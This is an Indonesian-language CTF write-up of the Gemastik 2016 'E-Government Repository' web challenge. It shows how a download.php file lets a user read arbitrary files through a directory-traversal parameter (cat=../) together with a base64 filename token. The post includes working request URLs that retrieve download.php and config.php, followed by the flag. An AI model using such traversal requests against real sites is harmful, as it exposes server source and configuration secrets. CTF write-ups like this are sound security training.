---
layout: post
title: "Writeup Gemastik 2016 : E-Government Repository - 75"
description: "Writeup Gemastik 2016 Online Capture The Flag Qualification"
headline: 
modified: 2016-08-15
category: Web Exploitation
tags: [gemastik]
imagefeature: /images/gemastik.png
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

![E-Government Repository](/images/egovernment-repository.png)


### Solusi :

Vulnerability terletak pada file download.php yang memungkinkan kita untuk mendownload file .php nya sendiri.
untuk mendownload file di butuhkan 3 parameter.

`file=NAMAFILE` , `token=BASE64(NAMAFILE)` , `cat=DIREKTORI`

jadi untuk mendownload file download.php kita sesuaikan 3 parameter tersebut.

[https://target.netsec.gemastik.ui.ac.id/4d87e482b4f7b56fcafa208a2889bdbe/e-government-repository/download.php?file=download.php&token=ZG93bmxvYWQucGhw&cat=../](https://target.netsec.gemastik.ui.ac.id/4d87e482b4f7b56fcafa208a2889bdbe/e-government-repository/download.php?file=download.php&token=ZG93bmxvYWQucGhw&cat=../)

kemudian download file `config.php`

[https://target.netsec.gemastik.ui.ac.id/4d87e482b4f7b56fcafa208a2889bdbe/e-government-repository/download.php?file=config.php&token=Y29uZmlnLnBocA==&cat=../](https://target.netsec.gemastik.ui.ac.id/4d87e482b4f7b56fcafa208a2889bdbe/e-government-repository/download.php?file=config.php&token=Y29uZmlnLnBocA==&cat=../)

**Flag : ** `GEMASTIK{The_Panama_Papers_are_the_largest_data_leak_and_caused_by_LFI}`


